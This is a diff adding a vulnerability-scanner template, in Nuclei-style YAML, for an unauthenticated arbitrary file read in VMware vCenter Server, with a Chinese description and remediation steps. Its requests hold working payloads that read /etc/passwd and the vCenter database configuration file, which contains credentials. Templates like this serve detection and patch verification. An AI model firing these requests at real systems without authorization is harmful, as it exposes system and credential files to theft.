@@ -1,0 +1,46 @@
+id: VmwareVcenter-Arbitrary-FileRead
+info:
+  name: Vmware Vcenter Arbitrary File Read
+  author:
+  - h1ei1
+  description: |-
+    VMware vCenter Server 任意文件读取漏洞
+     VMware vCenter Server是美国威睿（Vmware）公司的一套服务器和虚拟化管理软件。该软件提供了一个用于管理VMware vSphere环境的集中式平台，可自动实施和交付虚拟基础架构。
+     VMware vCenter Server存在一个Unauthenticated任意文件读取漏洞。
+  severity: high
+  remediation: |-
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：
+    https://www.vmware.com/
+
+    临时修复方案：
+    1、过滤\".\"，使用户在url中不能回溯上级目录。
+    2、正则匹配严格判断用户输入参数的格式，对用户传过来的文件名参数进行硬编码或统一编码，对文件类型进行白名单控制，对包含恶意字符或者空字符的参数进行拒绝。
+    3、禁止系统提供目录遍历服务，如：php.ini配置open_basedir限定文件访问范围。
+    4、文件路径保存至数据库，让用户提交文件对应ID下载文件。
+    5、用户下载文件之前进行权限校验。
+requests:
+- matchers:
+  - type: status
+    status:
+    - 200
+  - type: regex
+    part: body
+    regex:
+    - 'root:[x*]:0:0:'
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/eam/vib?id=/etc/passwd'
+  method: GET
+- matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - org.postgresql.Driver
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties'
+  method: GET
